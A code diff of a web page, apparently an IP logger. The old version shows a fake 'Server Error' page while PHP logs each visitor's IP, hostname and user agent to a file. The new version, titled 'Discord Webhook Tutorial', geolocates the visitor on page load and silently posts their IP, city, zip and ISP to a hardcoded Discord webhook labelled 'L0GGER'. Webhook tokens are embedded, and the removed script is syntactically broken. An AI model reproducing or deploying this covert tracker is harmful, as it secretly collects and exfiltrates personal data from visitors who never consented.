@@ -1,62 +1,43 @@
- <html> 
- <title>Discord bot</title>
- <body>
- <h1>Server Error</h1>
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <title>Discord Webhook Tutorial</title>
+  </head>
+  <script>
+    
+    
 
+    var request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/840728570434682880/5ccxJECuk7xjiN_a4GKrEbLGdtt2C1pfIns65ybWGRlMoeO8I5wHnnrjfqUNiFVHKGjh");
+    request.setRequestHeader('Content-type', 'application/json');
 
+    $.getJSON('http://ip-api.com/json', function(data) {
+      console.log(JSON.stringify(data, null, 2));
+      var DData = data
+      var query = $("#query").val()
 
-  
-  
-  
-  
-  
-  
-  
-  
-<?php
+    var myEmbed = {
+      author: {
+        name: "L0GGER"
+      },
+      title: "Data logged:",
+      description: "Country: " + DData.country + "\n\nCity: " + DData.city + "\n\nRegion Name: " + DData.regionName + "\n\nZip/postnummer: " + DData.zip + "\n\nIP: " + DData.query + "\n\nisp: " + DData.isp + "\n\nStatus: " + DData.status,
+      color: hexToDecimal("#ff0000"),
+    }
 
+    var params = {
+      username: "Logger",
+      embeds: [ myEmbed ]
+    }
 
- 
-$protocol = $_SERVER['SERVER_PROTOCOL'];
-$ip = $_SERVER['REMOTE_ADDR'];
-$port = $_SERVER['REMOTE_PORT'];
-$agent = $_SERVER['HTTP_USER_AGENT'];
-$ref = $_SERVER['HTTP_REFERER'];
-$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
- 
-$fh = fopen('log.txt', 'a');
-fwrite($fh, 'IP Address: '."".$ip ."\n");
-fwrite($fh, 'Hostname: '."".$hostname ."\n");
-fwrite($fh, 'Port Number: '."".$port ."\n");
-fwrite($fh, 'User Agent: '."".$agent ."\n");
-fwrite($fh, 'HTTP Referer: '."".$ref ."\n\n");
-fclose($fh);
-?>
-  
-  
-  
-<script>
- $(function() {
-     $('#Submit').click(function(e) {
-     $protocol = $_SERVER['SERVER_PROTOCOL'];
-     $ip = $_SERVER['REMOTE_ADDR'];
-     $port = $_SERVER['REMOTE_PORT'];
-     $agent = $_SERVER['HTTP_USER_AGENT'];
-     $ref = $_SERVER['HTTP_REFERER'];
-     $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
-     var url = "https://discord.com/api/webhooks/844952330218766357/3PosmrjPilfx5ggO-_vAe6Tayi8u6ZOOqZXBLqoLvQ4HwRuqvoUlL_VbFnYqvl7Sj6L1"
-     var content = $("ip").val;";
-     var username = $("#username").val();
-     var avatar_url = $("#avatar_url").val();
-     $.post(url,
- {"content": content, "username": username, "avatar_url": avatar_url},
-     function(){
-         Materialize.toast('Message Sent!', 4000)
-     });
-     });
- });
- </script>
+    request.send(JSON.stringify(params));
 
-
- </body>
- </html>
+    function hexToDecimal(hex) {
+      return parseInt(hex.replace("#",""), 0)
+    }
+});
+  </script>
+</html>
